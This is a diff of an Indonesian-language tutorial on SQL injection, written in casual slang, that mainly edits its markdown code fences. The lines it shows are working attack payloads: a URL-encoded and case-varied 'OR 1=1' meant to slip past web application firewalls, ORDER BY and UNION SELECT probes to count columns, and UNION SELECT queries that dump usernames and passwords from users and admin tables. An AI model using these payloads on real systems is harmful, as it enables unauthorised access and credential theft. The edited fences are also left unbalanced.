@@ -51,7 +51,7 @@ Tips 2026: Sekarang banyak WAF (Web Application Firewall) yang udah pinter nge-d
 ```sql
 ' OR 1=1 --  →  %27%20OR%201%3D1%20--%20
 ' Or 1=1 --  →  Huruf 'O' besar kecil biar luput dari regex WAF
-
+```
 ---
 
 ### 2. Klasik Abadi — Login Bypass (Tanpa Password)
@@ -59,20 +59,20 @@ Kalo lo udah tau jumlah kolom di tabel asli, lo bisa pake UNION buat nyomot data
 
 Langkah pertama: Cari tau jumlah kolom pake ORDER BY sampai muncul error.
 
-SQL
+```SQL
 ' ORDER BY 1 -- 
 ' ORDER BY 2 -- 
 ' ORDER BY 3 -- 
 -- Sampe muncul error, berarti jumlah kolom = (angka sebelum error)
-Atau pake UNION SELECT:
+setelah tau kolom tinggal make UNION SELECT:
 
-SQL
+```SQL
 ' UNION SELECT NULL -- 
 ' UNION SELECT NULL,NULL -- 
 ' UNION SELECT NULL,NULL,NULL -- 
 Kalo udah tau jumlah kolom (misal 3), tinggal dump datanya:
 
-SQL
+```SQL
 ' UNION SELECT id, username, password FROM users -- 
 ' UNION SELECT null, name, pass FROM admin -- 
 Di 2026, Union-based masih jadi andalan karena response-nya langsung kelihatan di halaman web. Tinggal cocokin posisi kolom yang ditampilin.
